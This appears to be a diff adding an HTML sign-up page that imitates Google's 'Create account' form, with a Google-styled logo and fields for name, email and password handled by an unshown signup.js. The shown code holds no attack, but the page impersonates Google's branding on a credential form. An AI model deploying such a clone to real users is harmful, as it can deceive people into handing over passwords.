@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Create account</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500;700&family=Roboto:wght@400;500;700&display=swap" rel="stylesheet" />
+    <link rel="stylesheet" href="styles.css" />
+  </head>
+  <body>
+    <main class="page">
+      <section class="login-card" aria-label="Create account form">
+        <div class="logo" aria-label="Google logo">
+          <span class="g blue">G</span><span class="g red">o</span><span class="g yellow">o</span><span class="g blue">g</span><span class="g green">l</span><span class="g red">e</span>
+        </div>
+
+        <h1>Create account</h1>
+        <p class="subtitle">Sign up for your Google Account</p>
+
+        <form id="signupForm" novalidate>
+          <label class="input-group">
+            <span class="sr-only">Full name</span>
+            <input id="fullName" type="text" name="fullName" placeholder="Full name" autocomplete="name" />
+          </label>
+
+          <label class="input-group">
+            <span class="sr-only">Email</span>
+            <input id="signupEmail" type="email" name="email" placeholder="Email" autocomplete="email" />
+          </label>
+
+          <div class="password-wrap">
+            <label class="input-group password-group">
+              <span class="sr-only">Password</span>
+              <input id="signupPassword" type="password" name="password" placeholder="Password" autocomplete="new-password" />
+            </label>
+            <button type="button" id="toggleSignupPassword" class="toggle-password" aria-label="Show password">Show</button>
+          </div>
+
+          <p id="signupMessage" class="form-message" aria-live="polite"></p>
+
+          <div class="actions">
+            <a href="/" class="link">Already have an account?</a>
+            <button type="submit" class="primary-btn">Sign up</button>
+          </div>
+        </form>
+      </section>
+    </main>
+
+    <script src="signup.js"></script>
+  </body>
+</html>
